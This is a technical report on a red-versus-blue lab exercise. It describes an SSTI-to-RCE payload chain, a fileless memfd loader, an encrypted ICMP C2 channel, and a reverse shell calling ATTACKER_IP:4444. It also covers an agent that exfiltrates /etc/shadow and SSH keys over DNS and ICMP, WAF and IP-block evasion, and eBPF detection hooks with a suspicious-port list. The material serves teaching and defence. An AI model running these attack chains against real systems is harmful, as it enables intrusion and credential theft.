# Enterprise Attack-Defense Lab: Technical Analysis Report

## 1. Introduction

This project is a multi-round red-blue team engagement built around the Cyberattack Kill Chain. The system has 15+ components split across three areas: target infrastructure, red team offensive tools, and blue team defenses.

| Domain | Components | Key Capabilities |
|--------|-----------|-----------------|
| Target | `target_app.py`, `honeypot.py` | SSTI-vulnerable Flask API, fake SSH honeypot on port 2222 |
| Red Team | `red_attacker.py`, `red_reverse_shell.py`, `exploit.py`, `exfil_agent.py`, `exfil_listener.py`, `recon.sh`, `ip_switch.sh`, `deploy_agent.sh`, `post_exploit.sh` | Fileless ICMP C2 (AES-256-CTR), TCP reverse shell, DNS/ICMP exfiltration, WAF bypass, IP aliasing |
| Blue Team | `blue_ebpf_mdr.py` (v1), `blue_ebpf_mdr_v2.py`, `blue_mdr_network.py`, `soc_dashboard.py` | Two-layer defense: network (honeypot + iptables) and kernel (eBPF syscall hooks), real-time SOC dashboard |

The exercise runs across 7 rounds and shows the escalation between attack and defense. The red team deploys fileless malware with AES-256-CTR encrypted ICMP C2, adapts when blocked by pivoting to a TCP reverse shell, and exfiltrates data through covert DNS/ICMP channels. The blue team responds with network-layer deception, kernel-level eBPF behavioral detection, and a unified SOC dashboard.

The rest of this report walks through the technical details of each component -- how it works, why certain design choices were made, and what the limitations are.

---

## 2. Environment Architecture

```
┌────────────────────────────┐              ┌──────────────────────────────────┐
│   Attacker Machine (WSL2)  │              │     Lab Server (Target + Blue)   │
│                            │              │                                  │
│  red_attacker.py  (C2)     │    ICMP      │  target_app.py    (Flask :9999)  │
│  red_reverse_shell.py      │◄════════════►│  honeypot.py      (SSH :2222)    │
│  exploit.py                │    TCP       │                                  │
│  exfil_listener.py         │◄════════════►│  blue_ebpf_mdr.py    (v1)       │
│  recon.sh                  │    DNS       │  blue_ebpf_mdr_v2.py (v2)       │
│  ip_switch.sh              │◄════════════►│  blue_mdr_network.py             │
│  deploy_agent.sh           │              │  soc_dashboard.py   (:8080)     │
│  post_exploit.sh           │              │                                  │
└────────────────────────────┘              └──────────────────────────────────┘
```

- Attacker (WSL2): Ubuntu 22.04, root privileges for raw ICMP sockets
- Lab Server (Native Linux): Ubuntu 24.04, runs target services, eBPF defense, and SOC dashboard
- Protocols: ICMP echo request (fileless C2), TCP (reverse shell), DNS/ICMP (exfiltration)

---

## 3. Target Infrastructure

### 3.1 Vulnerable Flask Application (`target/target_app.py`)

This is a web-based "Diagnostic Portal" that accepts user queries on the `/diag` endpoint (port 9999). The vulnerability here is Server-Side Template Injection (SSTI) via Jinja2 (CWE-1336).

The root cause is a two-step composition flaw:

```python
# Step 1: Python f-string embeds user input into template SOURCE CODE
template = f"<pre>Query: {user_input}</pre>"

# Step 2: Jinja2 evaluates {{ }} expressions as live code
render_template_string(template)
```

If `user_input` contains `{{ 7*7 }}`, the resulting template string is `<pre>Query: {{ 7*7 }}</pre>`, and Jinja2 evaluates `7*7` as the integer `49`.

The safe pattern is to pass user data as a Jinja2 variable instead of embedding it in the template source:

```python
render_template_string("<pre>Query: {{ q | e }}</pre>", q=user_input)
# Jinja2 treats q as data, never code; auto-escaping prevents injection
```

From SSTI, the attacker can escalate to full RCE by traversing Python's object model:

```
config                           → Flask config object
  .__class__                     → <class 'flask.config.Config'>
  .__init__                      → Config's constructor method
  .__globals__                   → module-level globals of flask/config.py
  ['os']                         → os module (flask.config imports os)
  .popen('cmd')                  → subprocess execution → RCE
```

This works because Python's introspection lets any object reach its class and then the module globals of any method defined in that module. Flask's `config.py` has `import os` at the top level, so `os` sits in `Config.__init__.__globals__`. Jinja2's sandbox restricts attribute names starting with `_`, but the traversal uses `__class__`, `__init__`, `__globals__` -- the sandbox checks the attribute name, not what it resolves to. The end result is full RCE with the Flask process privileges.

### 3.2 SSH Honeypot (`target/honeypot.py`)

This is a low-interaction SSH honeypot on port 2222, part of the blue team's deception strategy. The idea is simple: a honeypot is a decoy service that exists solely to detect unauthorized access. Any interaction with it is suspicious because legitimate users have no reason to connect.

How it works:
1. Sends a realistic `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4\r\n` banner (RFC 4253 compliant) that fools nmap service detection (`-sV`)
2. Waits for the attacker's client hello data (up to 5 seconds)
3. Returns a fake `Permission denied (publickey,password)` response
4. Logs the attacker's IP, timestamp, port, and client data to `trap.log`

The `trap.log` file is continuously monitored by `blue_mdr_network.py`, which extracts attacker IPs and immediately blocks them via iptables. This gives the blue team a seamless detection-to-response pipeline. Every connection to port 2222 is by definition unauthorized, so there are effectively zero false positives.

---

## 4. Red Team Attack Analysis

### 4.1 Phase 1: Reconnaissance

Using `recon.sh` and manual nmap, the attacker identifies target services and maps the attack surface:

```bash
bash red_team/recon.sh <TARGET_IP>
# Equivalent to: nmap -p 2000-10000 -sV <TARGET_IP>
```

The scan reveals:
- Port 2222: SSH banner (the honeypot -- connecting here triggers an MDR IP block)
- Port 9999: Diagnostic API (the Flask SSTI vulnerability, which is the real target)

MITRE ATT&CK: T1595 (Active Scanning)

If the attacker connects to port 2222 during recon, their IP gets logged and blocked by the network MDR.

---

### 4.2 Phase 2: Weaponization and Delivery -- Fileless ICMP C2

Using `red_attacker.py`, the attacker constructs and delivers an SSTI payload that achieves fileless RCE with an AES-256-CTR encrypted ICMP C2 channel.

#### 4.2.1 SSTI Payload Delivery Chain (4 Stages)

The attack is delivered as a single HTTP POST request that triggers a multi-stage execution chain:

**Stage 1 -- SSTI Injection**: The Jinja2 expression `{{ config.__class__.__init__.__globals__['os'].popen('...').read() }}` traverses Python's object model to reach `os.popen()`, which spawns a shell subprocess.

**Stage 2 -- Base64 Shell Pipeline**: The shell command is `echo <B64>|base64 -d|python3`. This decodes the loader script and pipes it to python3.

**Stage 3 -- Loader** (runs as python3 subprocess):
1. Decodes the agent from base64
2. Calls `memfd_create` (syscall 319) to create an anonymous fd
3. Writes agent code into the fd
4. Calls `fork()` -- parent exits (Flask popen returns)
5. Child calls `execve("/usr/bin/python3", ["/proc/<pid>/fd/<N>"])` -- runs agent from memory

**Stage 4 -- Agent** (runs as orphan process, entirely in RAM): Opens a raw ICMP socket and begins beaconing to the C2 server.

#### 4.2.2 Double Base64 Encoding

The payload uses double base64 encoding to get around escaping issues:

```
[Agent Python source]
    → base64 encode → agent_b64
        → embed in Loader Python script
            → base64 encode → loader_b64
                → embed in SSTI string: echo loader_b64 | base64 -d | python3
                    → URL encode → curl -d "query=..."
```

The reason for double encoding rather than single: the SSTI string uses single quotes to wrap the shell command. If the loader script contains quotes or special characters, it would break the SSTI syntax. Base64 output only uses `A-Za-z0-9+/=`, which are safe in both shell and Jinja2 contexts.

#### 4.2.3 Fileless Execution via memfd_create

Traditional malware writes executables to disk (`/tmp/backdoor`), creating file artifacts that can be found by filesystem watchers (inotify), on-access AV scanners, and forensic analysis. The Linux `memfd_create(2)` system call (syscall 319 on x86_64, available since Linux 3.17) avoids this entirely.

```
memfd_create(name, flags) → fd
```

What this does:
1. Creates an anonymous file in the kernel's tmpfs layer
2. Returns a file descriptor (fd) that behaves like a regular file
3. The fd is not linked to any directory entry -- it's invisible in all mounted filesystems
4. Content resides in page cache (RAM), never written to a block device
5. `/proc/<pid>/fd/<N>` provides a synthetic path that `execve()` can use

The full attack chain looks like:

```
fd = ctypes.CDLL(None).syscall(319, b"", 0)   # anonymous fd in RAM
os.write(fd, agent_code)                        # write payload to fd (still in RAM)
pid = os.fork()                                 # fork: parent returns for Flask response
  ├── parent: exits                             # popen() completes, HTTP response sent
  └── child: os.execve("/usr/bin/python3",      # execute agent from memfd
        ["python3", "/proc/<pid>/fd/<N>"],       # kernel resolves path → reads memfd → RCE
        dict(os.environ))
```

The reason `/proc/<pid>/fd/N` works with execve is that procfs is a virtual filesystem where each fd entry is a symlink to the kernel's `struct file` object. `execve()` resolves the symlink, reaches the anonymous inode, and reads the memfd content. And since `fork()` duplicates the fd table, the child's fd copy remains valid even after the parent exits.

`fork()` is also necessary here because the SSTI `popen()` subprocess must exit promptly for Flask to return the HTTP response. The fork creates a child that runs independently -- when the parent exits, the child becomes an orphan re-parented to PID 1, and its memfd fd (a duplicate from the fork) stays valid.

The result is zero file artifacts on disk, evading all file-based AV/EDR detection.

#### 4.2.4 AES-256-CTR Encryption via OpenSSL

The ICMP C2 channel uses AES-256-CTR encryption implemented via ctypes calls to the system's OpenSSL libcrypto library.

```python
_libcrypto = ctypes.CDLL(ctypes.util.find_library('crypto') or 'libcrypto.so')
# Uses EVP_CIPHER_CTX_new, EVP_aes_256_ctr, EVP_EncryptInit_ex, EVP_EncryptUpdate
AES_KEY = hashlib.sha256(SHARED_SECRET).digest()  # 32 bytes for AES-256
```

Key derivation is `AES_KEY = SHA-256(SHARED_SECRET)`, producing a 32-byte key. For each packet, a random 16-byte IV (`os.urandom(16)`) is generated and prepended to the ciphertext, so identical plaintexts produce different ciphertexts.

Properties of AES-256-CTR:

| Property | Description |
|----------|-------------|
| Algorithm | AES-256 in Counter (CTR) mode |
| Key space | 2^256 (computationally infeasible to brute-force) |
| Semantic security | Random IV per packet prevents pattern analysis |
| No padding | Ciphertext length equals plaintext length (ideal for ICMP payload) |
| Symmetric CTR | Encrypt and decrypt are the same operation (XOR with keystream) |
| Dependencies | System libcrypto via ctypes (pre-installed on all Linux distros) |

The reason for using ctypes+OpenSSL instead of a pip package is that the agent runs on the target machine via memfd_create. Calling the system's pre-installed OpenSSL through ctypes means zero pip dependencies on the target, keeping the agent self-contained with only Python stdlib.

For context, the project originally used a simple XOR cipher. Here's how the two compare:

| Property | XOR (Original) | AES-256-CTR (Current) |
|----------|----------------|----------------------|
| Key derivation | Fixed 16-byte plaintext key | SHA-256(shared_secret) → 32 bytes |
| IV/Nonce | None | Random 16-byte IV per packet |
| Known-plaintext resistance | Trivially broken (key XOR plaintext = key) | Computationally infeasible |
| Frequency analysis | Vulnerable (no IV means identical plaintext → identical ciphertext) | Immune (random IV per packet) |
| Implementation | Pure Python | ctypes + OpenSSL libcrypto |
| Dependencies | None | System libcrypto (pre-installed on Linux) |

The upgrade from XOR to AES-256-CTR shows that real-world malware increasingly uses strong cryptography, which makes payload inspection useless. This is exactly why behavior-based detection (eBPF) matters -- it monitors what a process *does* (syscall patterns) rather than what its traffic contains.

#### 4.2.5 ICMP Covert Channel

ICMP (Internet Control Message Protocol, RFC 792) is a Layer 3 protocol for network diagnostics. It's well-suited for covert channels for several reasons:

1. Firewalls typically allow ICMP by default since blocking it breaks ping/traceroute
2. ICMP Echo Request/Reply carry an arbitrary-length data payload -- the protocol doesn't constrain the content
3. Most IDS/IPS inspect TCP/UDP ports and payloads but treat ICMP payload as opaque diagnostic data
4. ICMP has no port numbers, so there's no connection state, making it harder to track

On Linux, raw ICMP sockets work like this:
```python
socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)  # requires root or CAP_NET_RAW
```
- The kernel delivers a copy of each incoming ICMP packet to raw sockets
- The kernel also auto-replies to echo requests (sends echo reply)
- We filter by ICMP ID field (0x1337) and type (8 = echo request)

The protocol is structured as follows:

```
┌──────────────────────────────────────────────────────┐
│ IP Header (20B) │ ICMP Header (8B) │ Payload        │
│                 │ type=8 code=0    │ ┌─────────────┐│
│                 │ checksum         │ │ MAGIC  (1B) ││
│                 │ ID=0x1337        │ │ MSG_TYPE(1B)││
│                 │ SEQ              │ │ IV (16B)    ││
│                 │                  │ │ AES-CTR data││
│                 │                  │ └─────────────┘│
└──────────────────────────────────────────────────────┘

MSG_TYPE:
  0x01 = Heartbeat (Agent → C2): hostname, UID, kernel version
  0x02 = Command   (C2 → Agent): shell command to execute
  0x03 = Result    (Agent → C2): chunked output with [idx:u16][total:u16] header
```

Both sides send ICMP type 8 (echo request) and ignore type 0 (echo reply), since kernel auto-replies carry the original payload, not C2 commands.

For the ICMP checksum (RFC 1071): treat the packet as a sequence of 16-bit big-endian integers, sum them all using ones' complement addition (carry wraps around), then take the bitwise NOT of the final sum. The receiver runs the same calculation over the entire packet including the checksum field; `0xFFFF` means valid.

#### 4.2.6 C2 Agent Behavior

The agent runs entirely in memory and follows this loop:
1. Initial heartbeat: transmit hostname, UID, kernel version
2. Repeat heartbeat every 30 seconds
3. Receive MSG_COMMAND → `subprocess.run(cmd, shell=True, capture_output=True, timeout=15)`
4. Split output into 480-byte chunks → encrypt with per-chunk random IV → transmit each
5. On `__exit__` command → close socket and terminate

Random timing jitter is added to make traffic pattern analysis harder:
```python
time.sleep(random.uniform(1.0, 2.5))  # random delay each loop iteration
time.sleep(0.05)                       # 50ms inter-chunk delay
```

The C2 server (`C2Server` class) has two threads: the main thread runs an interactive command prompt (blocking input), while a listener thread does background ICMP packet capture and result reassembly. They coordinate via `threading.Event`. Available commands include `<cmd>` (execute on target), `payload` (print curl command), `status` (agent info), `exit` (kill agent), and `quit` (leave C2, agent stays alive).

MITRE ATT&CK: T1190, T1059.006, T1620, T1027, T1095

The end result is full remote shell access with communication hidden inside ICMP traffic and encrypted with AES-256-CTR.

---

### 4.3 Phase 3: Post-Exploitation

Using `post_exploit.sh` and C2 shell commands, the attacker performs reconnaissance from within the compromised target:

```
C2> whoami          → confirm execution identity
C2> id              → UID/GID information
C2> uname -a        → OS and kernel version
C2> cat /etc/passwd → user enumeration
C2> ip addr         → network interface configuration
C2> netstat -tlnp   → listening services
```

MITRE ATT&CK: T1082 (System Information Discovery)

---

### 4.4 Phase 4: Evasion -- IP Alias Bypass

After the red team's reconnaissance triggers the honeypot on port 2222, the network MDR blocks their IP via iptables. To regain network access, `ip_switch.sh` uses IP aliasing to add a secondary address to the same interface:

```bash
sudo ip addr add 172.22.137.15/20 dev eth0
```

| IP | Role | Status |
|----|------|--------|
| 172.22.137.14 (primary) | Triggered honeypot | Blocked by iptables DROP |
| 172.22.137.15 (alias) | Attack via port 9999 | Not blocked (new, unknown IP) |

This works because iptables rules are IP-based -- a new source IP has no matching DROP rule, so packets pass through. Of course, this also shows why IP-based blocking alone isn't enough; the blue team needs behavior-based detection (eBPF) that works regardless of source IP.

MITRE ATT&CK: Defense Evasion (no specific ATT&CK technique -- IP aliasing is a general network-level evasion)

---

### 4.5 Phase 5: Evasion -- TCP Reverse Shell (eBPF v1 Bypass)

At this point, the blue team has deployed eBPF v1 (`blue_ebpf_mdr.py --kill`), which detects and kills the fileless ICMP C2. The red team needs to adapt.

The key observation is that eBPF v1 hooks three syscalls, and a TCP reverse shell (`red_reverse_shell.py`) triggers none of them:

| eBPF v1 Hook | Triggered? | Reason |
|-------------|-----------|--------|
| `memfd_create` | No | No memfd; uses fork() directly |
| `execve /proc/fd` | No | Executes `/bin/bash`, not from `/proc/fd` |
| `socket(SOCK_RAW)` | No | Uses `SOCK_STREAM` (TCP), not `SOCK_RAW` |

The reverse shell attack chain:

```
SSTI → os.popen → base64 -d | python3 → fork()
  └→ child: socket(AF_INET, SOCK_STREAM)
       → connect(ATTACKER_IP:4444)
       → dup2(sock_fd, 0)    ← redirect stdin
       → dup2(sock_fd, 1)    ← redirect stdout
       → dup2(sock_fd, 2)    ← redirect stderr
       → pty.spawn("/bin/bash")  ← interactive shell
```

Compared to `red_attacker.py`, this approach uses no `memfd_create`, no ICMP raw socket, no `execve` from `/proc/fd`, and doesn't need `sudo`. It still uses the same SSTI injection mechanism for delivery, but the base64-decoded payload is just a simple fork+connect+dup2+pty script.

The listener is a built-in TCP listener (`select()`-based) that catches the incoming connection on port 4444.

MITRE ATT&CK: T1059.006, T1095, T1571

This gives the attacker a full interactive shell that completely bypasses eBPF v1 detection.

---

### 4.6 Phase 5b: Data Exfiltration

After establishing access, the red team exfiltrates sensitive data through covert channels using `exfil_agent.py` (target-side), `exfil_listener.py` (attacker-side), and `deploy_agent.sh`.

#### 4.6.1 Exfiltration Agent (`exfil_agent.py`)

Deployed to the target via the C2 shell or reverse shell. It automatically collects:
- `/etc/passwd`, `/etc/shadow`
- SSH keys (`~/.ssh/`)
- Bash history (`~/.bash_history`)
- Application source code
- Crontab and environment variables
- Other users' home directory contents

The agent probes available exfiltration channels in priority order:
1. DNS (via `dig` command) -- preferred
2. DNS (via Python socket fallback) -- if `dig` isn't available
3. ICMP (via `ping`) -- last resort

After exfiltration completes, the agent deletes its own file from disk (`os.remove(os.path.abspath(__file__))`) to remove forensic evidence.

#### 4.6.2 DNS Exfiltration Channel

Data is Base32-encoded and embedded as subdomain labels in DNS queries:

```
Protocol:
  START: start.<fname_b32>.<file_id>.x.exfil.local
  DATA:  <seq>-<total>.<chunk_b32>.<file_id>.x.exfil.local
  END:   end.<md5_checksum>.<file_id>.x.exfil.local
```

- Chunk size: 50 bytes per DNS query
- Random inter-packet delay: 0.1--0.5 seconds
- Integrity: MD5 checksum in END signal for reassembly verification

#### 4.6.3 ICMP Exfiltration Channel

Data is hex-encoded and embedded in the padding pattern of ICMP echo requests via the `ping -p` option:

```
Protocol (16-byte payload per ping):
  START: magic(2) + type=0x01(1) + file_id(2) + filename(11)
  DATA:  magic(2) + type=0x00(1) + file_id(2) + seq(2) + total(2) + data(7)
  END:   magic(2) + type=0x02(1) + file_id(2) + checksum(8) + pad(3)
```

- Magic marker: `0xEFBE` for packet identification
- Chunk size: 7 bytes per ICMP packet
- Random inter-packet delay: 0.2--0.8 seconds

#### 4.6.4 Exfiltration Listener (`exfil_listener.py`)

Runs on the attacker machine, simultaneously listening on:
- UDP port 53 (fake DNS server): Parses DNS queries, extracts Base32 data from subdomain labels, sends NXDOMAIN responses
- Raw ICMP socket: Captures ICMP echo requests, searches for `0xEFBE` magic marker in payload

Both channels feed into a shared reassembly engine with per-file chunk tracking (sequence numbers), MD5 checksum verification on completion, safe file writing to `./loot/` with mode 0600, and privilege dropping after binding the raw socket so it runs as non-root after socket creation.

MITRE ATT&CK: T1048.003 (Exfiltration Over Alternative Protocol), T1005 (Data from Local System)

---

### 4.7 Legacy WAF Bypass (`red_team/exploit.py`)

This is a backup attack tool for scenarios with a Web Application Firewall. It uses several bypass techniques:
- `${IFS}` (Internal Field Separator): Replaces spaces to evade WAF space-matching rules
- Base64 encoding: Encodes the entire payload to avoid keyword blacklists
- `b\a\s\h`: Backslash obfuscation evades literal string matching for "bash"

MITRE ATT&CK: T1190, T1059.006, T1027

This tool targets an older socket-based target application and is kept mainly as a backup and for showing WAF evasion principles.

---

### 4.8 Shell Script Utilities

| Script | Purpose | MITRE ATT&CK |
|--------|---------|--------------|
| `recon.sh` | Automated nmap SYN scan + service version detection | T1595 |
| `ip_switch.sh` | IP alias management (add/remove/status) for MDR bypass | Defense Evasion |
| `deploy_agent.sh` | Generates base64-encoded deployment command for exfil agent | T1059 |
| `post_exploit.sh` | Post-exploitation enumeration (whoami, uname, ip addr, netstat) and persistence via crontab | T1082, T1053.003 |

---

## 5. Blue Team Defense Analysis

### 5.1 Defense-in-Depth Architecture

The blue team uses a two-layer defense, with each layer addressing different threat vectors:

```
┌─────────────────────────────────────────────────────┐
│  Layer 1 — Network (Cyber Deception)                │
│  honeypot.py (port 2222) → trap.log →               │
│  blue_mdr_network.py → iptables DROP                │
│  Detects: reconnaissance, blocks known-bad IPs       │
│  Limitation: attacker can change IP to bypass        │
├─────────────────────────────────────────────────────┤
│  Layer 2 — Kernel (eBPF Behavioral Detection)       │
│  v1: memfd_create + execve + raw ICMP socket         │
│  v2: + connect (suspect port) + dup2/dup3 (shell)   │
│  Detects: malicious behavior, regardless of source   │
│  Limitation: must know which syscalls to monitor     │
├─────────────────────────────────────────────────────┤
│  Visibility — SOC Dashboard (port 8080)             │
│  Aggregates all events in real-time web UI           │
└─────────────────────────────────────────────────────┘
```

The point is that each layer has inherent limitations, and only the combination provides real protection. Network-layer defense blocks known-bad IPs but gets bypassed by IP aliasing. Kernel-layer defense detects malicious behavior regardless of source IP but you have to know which syscalls to monitor.

---

### 5.2 Layer 1: Network MDR (`blue_team/blue_mdr_network.py`)

This is a monitoring daemon that polls `trap.log` (written by the honeypot) for new attacker IP entries. When it finds one, it runs:

```
iptables -I INPUT 1 -s <attacker_ip> -j DROP
```

The rule goes at position 1 (highest priority) in the INPUT chain so it takes precedence over any existing ACCEPT rules.

Some implementation details:
- IP extraction uses regex pattern matching on `trap.log` entries
- Already-blocked IPs are tracked in a set to avoid duplicates
- `--cleanup` removes all added iptables rules on exit
- `--soc-log` writes events to a JSONL file for SOC dashboard integration
- Polling interval is configurable (default 1 second)

Since any connection to the honeypot on port 2222 is unauthorized by definition, false positives are essentially zero. The obvious limitation is that IP-based blocking can be circumvented by changing the source IP (as shown with `ip_switch.sh`), which is why Layer 2 is needed.

---

### 5.3 Layer 2: eBPF Kernel-Level Detection

#### 5.3.1 eBPF Architecture Overview

eBPF (extended Berkeley Packet Filter) lets you run sandboxed programs inside the Linux kernel without modifying kernel source code or loading kernel modules.

The execution pipeline:
```
C source → Clang/LLVM compile → eBPF bytecode → Kernel Verifier validation
  → JIT compile to x86_64 native code → attach to Tracepoint → zero-overhead execution
```

The verifier enforces several safety guarantees: no unbounded loops (provable termination required), no out-of-bounds memory access, no arbitrary pointer dereference, and stack size limited to 512 bytes. An eBPF program cannot crash or hang the kernel.

What makes eBPF useful for security monitoring:
- Runs in kernel space with zero context-switch overhead
- Sees all syscalls before they execute (tracepoints on `sys_enter_*`)
- Can read process metadata (PID, UID, comm) from the kernel `task_struct`
- Can actively respond -- `bpf_send_signal()` kills processes from kernel space
- Can't be evaded by userspace anti-debugging or rootkit techniques

#### 5.3.2 Tracepoints vs Kprobes

| Property | Tracepoint | Kprobe |
|----------|-----------|--------|
| Type | Static (compiled into kernel) | Dynamic (runtime injection) |
| Stability | Stable ABI across versions | Function signatures may change |
| Trigger timing | Syscall entry/exit | Any kernel function |
| Use case | Syscall monitoring | Deep kernel debugging |

We use tracepoints because `sys_enter_*` fires before the syscall executes (so preemptive kill is possible), they're stable across kernel 5.x--6.x, and BCC provides clean `TRACEPOINT_PROBE()` macros.

#### 5.3.3 `bpf_send_signal(SIGKILL)` Mechanism

Available since Linux 5.3. This BPF helper sends a signal to the current task (the process that triggered the tracepoint).

The difference from userspace `kill()` is significant:

```
eBPF path (bpf_send_signal):
  syscall entry → tracepoint fires → eBPF runs →
  → bpf_send_signal(9) → process killed (syscall never completes)
  Latency: < 1 microsecond

Userspace path (kill()):
  syscall entry → tracepoint fires → eBPF sends perf event →
  → Python reads event → Python calls os.kill() → kernel delivers signal
  Latency: milliseconds (malware may have already completed its operation)
```

With `bpf_send_signal`, the process is killed before the syscall handler runs, so the attack chain is broken at the very first step.

#### 5.3.4 eBPF Data Structures

BPF_PERF_OUTPUT (Perf Ring Buffer) is a lock-free circular buffer shared between kernel and userspace via mmap. The kernel writes events and Python reads them via callback -- zero-copy communication.

BPF_HASH (Hash Map) is used for several purposes:
- `memfd_pids`: tracks PIDs that called memfd_create (for correlation)
- `whitelist`: userspace writes safe PIDs, kernel reads during hook execution
- `suspect_ports` (v2): configurable suspicious destination ports
- `dup2_tracker` (v2): per-PID bitmask tracking fd 0/1/2 redirection

---

### 5.4 eBPF MDR v1 (`blue_team/blue_ebpf_mdr.py`)

v1 uses three tracepoint hooks to detect fileless malware:

| Hook | Tracepoint | Detection Logic | Severity |
|------|-----------|----------------|----------|
| Hook 1 | `sys_enter_memfd_create` | Any invocation → record PID + timestamp for correlation | HIGH |
| Hook 2 | `sys_enter_execve` | Pattern-match filename for `/proc/<pid>/fd/*` → fileless exec confirmed | CRITICAL |
| Hook 3 | `sys_enter_socket` | `AF_INET(2) + SOCK_RAW(3) + IPPROTO_ICMP(1)` + PID correlates with memfd | CRITICAL |

Hook 1 (memfd_create detection) fires at syscall entry, before the anonymous fd is created. It records PID + timestamp in the `memfd_pids` hash map for later correlation. In `--kill` mode, `bpf_send_signal(9)` terminates the process before the fd even exists.

Hook 2 (fileless execution detection) reads the `filename` argument of execve and checks whether it starts with `/proc/` (6 bytes), then scans positions 6--19 for a `/fd/` substring. The bounded loop (14 iterations) satisfies the eBPF verifier's termination requirement.

Hook 3 (ICMP covert channel detection) filters for `socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)` specifically, then checks the `memfd_pids` hash map for the current PID or parent PID. If there's a match, it's a "CORRELATED:memfd+icmp" event -- fileless C2 confirmed, severity CRITICAL. If it's a standalone raw ICMP socket it just generates an alert, since it could be legitimate (e.g., ping).

The correlation logic is what makes this effective:
- `memfd_create` alone → HIGH (could be legitimate -- Chrome IPC, systemd, etc.)
- Raw ICMP socket alone → ALERT (could be ping)
- `memfd_create` + raw ICMP socket from the same process → CRITICAL + CORRELATED (fileless C2 confirmed)

There's also a cold-start detection feature: at startup, a `/proc/*/exe` scanner checks for already-running memfd processes, covering the gap before eBPF hooks are active. With `--kill` enabled, those are killed immediately via `os.kill(pid, SIGKILL)`.

Self-PID is always whitelisted, and you can add more via `--whitelist 1234,5678`.

---

### 5.5 eBPF MDR v2 (`blue_team/blue_ebpf_mdr_v2.py`)

v1 only catches fileless malware using `memfd_create` + ICMP raw sockets. A standard TCP reverse shell (fork → connect → dup2 → pty.spawn) bypasses all v1 hooks because it never calls `memfd_create` or opens a raw socket. That's why v2 was needed.

v2 keeps all 3 v1 hooks and adds 3 new ones:

| Hook | Tracepoint | Detection Logic | Severity |
|------|-----------|----------------|----------|
| Hook 4 | `sys_enter_connect` | Destination port matches configurable suspicious-ports list | CRITICAL |
| Hook 5 | `sys_enter_dup2` | Per-PID bitmask; when fd 0,1,2 all redirected → reverse shell confirmed | CRITICAL |
| Hook 6 | `sys_enter_dup3` | Same as Hook 5 (covers `os.dup2(fd, fd2, inheritable=False)` code path) | CRITICAL |

#### Hook 4 -- Suspicious Port Detection (`sys_enter_connect`)

This hook reads the first 8 bytes of `sockaddr_in` from userspace to extract `sin_family` and `sin_port`, then checks the port against the `suspect_ports` BPF_HASH map.

Default suspicious ports: 4444, 4445, 5555, 1234, 1337 (configurable via `--suspect-ports`).

```c
// Read sockaddr: [family:2][port:2][addr:4]
u16 family = *(u16 *)&sa_buf[0];
u16 port_be = *(u16 *)&sa_buf[2];
u16 port = ntohs(port_be);

u8 *is_suspect = suspect_ports.lookup(&port);
if (!is_suspect) return 0;  // Not suspicious, ignore
```

This catches connections at connect time, which is fast. The limitation is that it only works for known suspicious ports -- a reverse shell on port 80/443 would get past this hook alone.

#### Hook 5/6 -- Reverse Shell Pattern Detection (`sys_enter_dup2`, `sys_enter_dup3`)

These hooks track a per-PID bitmask in the `dup2_tracker` BPF_HASH. Each time a process calls `dup2(oldfd, newfd)` where `newfd` is 0, 1, or 2, the corresponding bit is set:

```c
u8 new_mask = mask ? *mask : 0;
new_mask |= (1 << newfd);       // Set bit for fd 0, 1, or 2
dup2_tracker.update(&e.pid, &new_mask);

if (new_mask == 0x07) {         // All three bits set: 0b111 = 7
    // Reverse shell confirmed: stdin + stdout + stderr all redirected
    bpf_send_signal(9);
}
```

Both dup2 and dup3 need to be hooked because Python's `os.dup2(fd, fd2, inheritable=False)` actually calls `dup3()` (with `O_CLOEXEC` flag) instead of `dup2()`. Without Hook 6, an attacker could bypass detection just by passing `inheritable=False`.

The important thing about the dup2/dup3 approach is that it's port-agnostic. It catches reverse shells on any port, including 80 or 443. The behavioral signature of a reverse shell -- redirecting all three standard file descriptors -- is the same regardless of what transport protocol or port is used.

#### v2 SOC Integration

With `--soc-log`, v2 writes JSON events to a JSONL file that the SOC dashboard reads in real-time:

```json
{
    "ts": "2024-01-15 14:30:22",
    "source": "EBPF_v2",
    "event": "REVERSE_SHELL",
    "severity": "CRITICAL",
    "action": "KILLED",
    "detail": "PID:12345 PPID:12340 REVERSE_SHELL:fd0+fd1+fd2_hijack"
}
```

---

### 5.6 SOC Dashboard (`blue_team/soc_dashboard.py`)

A Flask-based web application (port 8080) that pulls in events from all defensive components and shows them on a real-time dark-themed SOC console.

```
Data Sources                 Dashboard Server                Browser
┌────────────┐              ┌──────────────────┐           ┌──────────┐
│ trap.log   │──(poll)──────│ FileWatcher      │           │          │
│ (honeypot) │              │   parse_trap_log │──(events)─│  SSE     │
├────────────┤              ├──────────────────┤           │  stream  │
│ soc_events │──(poll)──────│ FileWatcher      │           │  auto-   │
│ .jsonl     │              │   parse_soc_jsonl│──(events)─│  scroll  │
├────────────┤              ├──────────────────┤           │          │
│ HTTP POST  │──(direct)────│ /api/event       │──(events)─│          │
└────────────┘              └──────────────────┘           └──────────┘
```

It uses Server-Sent Events (SSE) via `/stream` for real-time browser updates, reads from multiple sources (`trap.log` for honeypot events, `soc_events.jsonl` for eBPF alerts and iptables blocks), and exposes an HTTP POST API (`/api/event`) for programmatic event submission. The UI has statistics cards (total events, blocked IPs, process kills, critical alerts), color-coded severity levels (CRITICAL = red, HIGH = yellow, MEDIUM = blue, INFO = gray), and an auto-scrolling event timeline.

Integration points:
- `honeypot.py` → writes to `trap.log` → dashboard polls and displays
- `blue_mdr_network.py --soc-log` → writes JSONL → dashboard polls and displays
- `blue_ebpf_mdr_v2.py --soc-log` → writes JSONL → dashboard polls and displays

---

## 6. 7-Round Iterative Engagement

The demo is structured as 7 rounds showing the back-and-forth escalation between red and blue:

| Round | Actor | Action | Outcome |
|-------|-------|--------|---------|
| 1 | Red | Reconnaissance (nmap via `recon.sh`) | Discovers ports 2222 and 9999 |
| 1b | Red → Blue | Honeypot trap triggered (port 2222) | Red team IP blocked via iptables |
| 1c | Red | IP alias bypass (`ip_switch.sh add`) | Regains network access with new IP |
| 2 | Red | SSTI + fileless C2 (`red_attacker.py`) | Full remote control via ICMP C2 |
| 3 | Blue | eBPF v1 deployed (`blue_ebpf_mdr.py --kill`) | Existing C2 agent killed; re-attacks blocked |
| 4 | Red | Re-attack with `red_attacker.py` | Blocked by eBPF v1 at `memfd_create` |
| 5 | Red | TCP reverse shell (`red_reverse_shell.py`) | Bypasses all 3 v1 hooks |
